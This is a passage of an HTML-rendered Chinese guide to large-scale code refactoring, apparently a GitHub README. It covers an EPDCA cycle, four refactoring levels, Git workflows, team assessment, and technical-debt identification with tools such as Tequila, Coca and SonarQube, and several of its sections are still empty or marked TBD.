&lt;p&gt;当你习惯了重构，记得在日常工作中使用。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重构模式epdca" class="anchor" aria-hidden="true" href="#重构模式epdca"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构模式：EPDCA&lt;/h3&gt;
&lt;p&gt;我尝试从书中找到一个合适的模式，但是都没有发现符合我的步骤。便在 PDCA 的前面加了个 E，代表了 evaluate：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;识别需要重构的地方&lt;/li&gt;
&lt;li&gt;制定重构计划，&lt;/li&gt;
&lt;li&gt;执行计划的重构任务&lt;/li&gt;
&lt;li&gt;使用测试对重构是否影响业务功能进行检察&lt;/li&gt;
&lt;li&gt;调整下一次重构策略&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对系统进行大规模重构的过程中，最难的地方在于识别，因为代码坏味道多的地方不一定是价值最高的。寻找你的价值曲线，寻找价值高、实施难度低的部分，是最体现你价值的地方。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-四级重构" class="anchor" aria-hidden="true" href="#四级重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;四级重构&lt;/h3&gt;
&lt;p&gt;实践的过程中，我们以拆解的方式，一步步由系统架构到代码级拆分。在某次吃饭的过程中，我发现不太对劲。我明明用的是敏捷式的重构方式，而非瀑布模式。它对应于四个不同的重构级别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;架构重构&lt;/strong&gt;。在不改变业务逻辑的情况下，根据单一职责和依赖倒置原则的思想：对系统进行模块拆分与合并，以明确职责降低耦合度；对包进行重新规划，划分包之间的边界，减少代码间的耦合。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模型重构&lt;/strong&gt;。在包含测试的情况下，通过识别和发现模型的行为，将行为聚合到模型中：根据方法名称、参数、返回判定内聚到模型中；从流程梳理是否符合业务场景 。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模式重构&lt;/strong&gt;。对于特定代码坏味道产生的问题，通过结合架构模式、设计模式来提升可读性。如：使用工厂模式统一管理对象的创建；使用策略模式降低复杂度。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码重构&lt;/strong&gt;。对于一些小的代码坏味道，可以通过 IDE 重构来快速改善即有代码，而不会影响到业务功能。如：复杂条件语句的提取；使用参数对象重构参数过多。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对应的模式如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/f8d134031f5308dc01ca6026d7d08b3d77b94a7b/68747470733a2f2f6d6967726174696f6e2e696e6b2f696d616765732f7265666163746f72696e672d6c6576656c732e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/f8d134031f5308dc01ca6026d7d08b3d77b94a7b/68747470733a2f2f6d6967726174696f6e2e696e6b2f696d616765732f7265666163746f72696e672d6c6576656c732e706e67" alt="四级重构" data-canonical-src="https://migration.ink/images/refactoring-levels.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这一点倒是与我们设计系统的时候，采用的《&lt;a href="https://www.phodal.com/blog/architecture-pyramid/" rel="nofollow"&gt;架构金字塔&lt;/a&gt;》颇为一致的：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/885cf813033733a00a6eea3a044e33acfe991113/68747470733a2f2f6d6967726174696f6e2e696e6b2f696d616765732f6172636869746563747572652d7072696d6172642e6a7067"&gt;&lt;img src="https://camo.githubusercontent.com/885cf813033733a00a6eea3a044e33acfe991113/68747470733a2f2f6d6967726174696f6e2e696e6b2f696d616765732f6172636869746563747572652d7072696d6172642e6a7067" alt="架构金字塔" data-canonical-src="https://migration.ink/images/architecture-primard.jpg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-小步前进" class="anchor" aria-hidden="true" href="#小步前进"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;小步前进&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;小步前进，拉一下最新的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不论改动的大小，一旦变动的文件多了，如移包、重命名用得广泛的类等等，记得随时提交。&lt;/p&gt;
&lt;p&gt;多说无益，步子迈大的时候，你就会回到这句话上。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-git--工作流" class="anchor" aria-hidden="true" href="#git--工作流"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Git  工作流&lt;/h3&gt;
&lt;p&gt;如果你们使用的版本控制工具，还不是 Git 话，那么你们可能需要好好反思一下，为什么会到现在的这种地步？&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-master-机制" class="anchor" aria-hidden="true" href="#master-机制"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Master 机制&lt;/h4&gt;
&lt;p&gt;或许因为我合作的同事主要是 ThoughtWorks 的员工，所以在项目合作上，代码水平并不会太差；或许因为我能容忍那些年轻的开发人员犯的错。&lt;/p&gt;
&lt;p&gt;我是一个喜欢用 master 分支的开发人员，主要是作为一个 Tech Lead，我并不想成为一个专职的 code reviewew。&lt;/p&gt;
&lt;p&gt;所以，在 master 分支上重构，对于每个人都是一个极大的考验。有没有足够的测试覆盖？有没有足够的工程支持？有没有配合的团队合作？&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-pr-机制" class="anchor" aria-hidden="true" href="#pr-机制"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PR 机制&lt;/h4&gt;
&lt;p&gt;对于采用 pull request / merge request 机制的团队来说，重构并不会一帆风顺。&lt;/p&gt;
&lt;p&gt;对于大的重构来说，如目录调整，你还能在花点时间重做。如果是代码重构，一旦重来的话，你可能会忘记你到底修改了什么。&lt;/p&gt;
&lt;p&gt;也经常不得不找个夜深人静的时间，加会班，提交上代码。&lt;/p&gt;
&lt;p&gt;所以，当你采用 PR 机制的时候，记得做一下笔记，写写你打算怎么改。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-建立远景与方向" class="anchor" aria-hidden="true" href="#建立远景与方向"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;建立远景与方向&lt;/h2&gt;
&lt;p&gt;TBD&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-拉通对齐目标" class="anchor" aria-hidden="true" href="#拉通对齐目标"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;拉通：对齐目标&lt;/h3&gt;
&lt;p&gt;会遇到不一样的需求，有的是明确的重构需求，有的则是隐藏在需求之后，有的则是看上去没有而已。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-明确潜在风险" class="anchor" aria-hidden="true" href="#明确潜在风险"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;明确潜在风险&lt;/h3&gt;
&lt;p&gt;你懂的。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-人评估" class="anchor" aria-hidden="true" href="#人评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;人评估&lt;/h3&gt;
&lt;p&gt;并非很有的人都具备足够的能力参与到重构的过程中。&lt;/p&gt;
&lt;p&gt;所以，在我们进入重构之前，需要：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确保对方有足够的能力&lt;/li&gt;
&lt;li&gt;确保和对方对于重构有共同的看法&lt;/li&gt;
&lt;li&gt;确保对方能配合你工作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为此，需要一些培训，又或者是激烈的讨论。&lt;/p&gt;
&lt;p&gt;他/她们需要具备以下的基本技能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理解面向对象设计&lt;/li&gt;
&lt;li&gt;了解设计模式&lt;/li&gt;
&lt;li&gt;了解写测试的重要性&lt;/li&gt;
&lt;li&gt;了解为什么要重构&lt;/li&gt;
&lt;li&gt;追求代码质量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然了，在了解的基本上有更深入的理解也是不错的。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重构范围" class="anchor" aria-hidden="true" href="#重构范围"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构范围&lt;/h3&gt;
&lt;p&gt;对于一个大的系统来说，系统的每一部分并非都是等价的。&lt;/p&gt;
&lt;p&gt;系统的核心就是系统的 core domain（核心域），一个有能力的管理者，能识别到哪一部分是系统的核心组成，并为它分配最好的开发人员；与此同时，对于支撑的部分来说，管理者只会分配少数的核心开发人员，只用于确保功能能按期完成。&lt;/p&gt;
&lt;p&gt;按照 DDD 的思想来看，就是核心域、支撑域、通用域的区别。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-产出物" class="anchor" aria-hidden="true" href="#产出物"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;产出物&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-kpi-度量" class="anchor" aria-hidden="true" href="#kpi-度量"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;KPI 度量&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-重建规范" class="anchor" aria-hidden="true" href="#重建规范"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重建规范&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-团队赋能" class="anchor" aria-hidden="true" href="#团队赋能"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;团队赋能&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-原则与模式" class="anchor" aria-hidden="true" href="#原则与模式"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;原则与模式&lt;/h4&gt;
&lt;h2&gt;&lt;a id="user-content-重构评估与度量" class="anchor" aria-hidden="true" href="#重构评估与度量"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构评估与度量&lt;/h2&gt;
&lt;p&gt;在接触代码之前，我们可以通过一些现成的工具，来对现有的项目进行一些不评估，并通过度量来提供指标。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-识别技术债务" class="anchor" aria-hidden="true" href="#识别技术债务"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;识别技术债务&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;对于技术债务，它的利息表现为系统的不稳定性，以及由于临时性手段和缺乏合适的设计、文档工作和测试带来的不断攀升的维护成本。 —— 《架构师应该知道的 97 件事》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如 Robert Nord 提出的 “技术债务全景图”（Tech Debt Landscape） 所示：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/tech-debt-landscape.png"&gt;&lt;img src="images/tech-debt-landscape.png" alt="技术债全景图" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;技术债对于软件的影响：可维护性（Maintainability）、可演进性（Evolvability），而这些技术债对于非技术人员来说都是不可见的。它们源于生活，藏于黑暗中。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-技术债风暴" class="anchor" aria-hidden="true" href="#技术债风暴"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;技术债风暴&lt;/h4&gt;
&lt;p&gt;在重构开始之前，我们可以进行技术债的头脑风暴，收集每个开发人员每迫切解决的技术痛点。并按照优先级来评估这些技术债，列入我们的重构范围中。&lt;/p&gt;
&lt;p&gt;如我的同事在《&lt;a href="https://insights.thoughtworks.cn/managing-technical-debt/" rel="nofollow"&gt;技术债治理的四条原则&lt;/a&gt;》 一文中所介绍的，我们可以在对应的限界上下文里，可视化技术债：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/tech-debt-mapping.png"&gt;&lt;img src="images/tech-debt-mapping.png" alt="Classified Technical Debt Mapping" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;再根据 “核心领域优于其他子域” 的原则，及其严重程度，来划分出技术债的优先级。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-架构评估技术驱动-vs-业务驱动" class="anchor" aria-hidden="true" href="#架构评估技术驱动-vs-业务驱动"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;架构评估：技术驱动 vs 业务驱动&lt;/h4&gt;
&lt;p&gt;如我在那篇 《&lt;a href="https://www.phodal.com/blog/refactor-mvc-architecture-to-ddd/" rel="nofollow"&gt;分层架构重构&lt;/a&gt;》 中所说，在大量的现有系统中，我们发现了 MVC 架构模式被落地为三层分层架构（controller-service-model）。开发人员对它们的错误等同，导致了架构上的一系列错误。&lt;/p&gt;
&lt;p&gt;对于简单的系统来说，CSM 的包结构问题不大。或者说，对于非常简单的系统来说，大泥球架构也没有问题。我们所针对的是那些中大规模的系统。在这些系统里，系统并非一次性的，开发出来就不再维护了。因此，它们需要对更合适的架构设计和包的拆分分。&lt;/p&gt;
&lt;p&gt;借助于 &lt;a href="https://github.com/newlee/tequila"&gt;Tequila&lt;/a&gt; 这样的架构可视化工具，又或者是 &lt;code&gt;coca arch&lt;/code&gt;，便可以得到项目的调用关系图，它可以在某种层面上反应出系统的架构。根据它，我们可以知道：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目的结构划分是否合理&lt;/li&gt;
&lt;li&gt;查看项目的代码中是否存在循环依赖的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;结果如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/coca-call.png"&gt;&lt;img src="images/coca-call.png" alt="Coca Call Graph" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过调用关系图，我们也可以查看类之间、包之间是否存在相互依赖。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-代码评估收集-bad-smell" class="anchor" aria-hidden="true" href="#代码评估收集-bad-smell"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码评估：收集 bad smell&lt;/h4&gt;
&lt;p&gt;对于这部分内容来说，你可以直接采用成熟的商业工具，如 SonarQube 便可以完成这方面的工作。&lt;/p&gt;
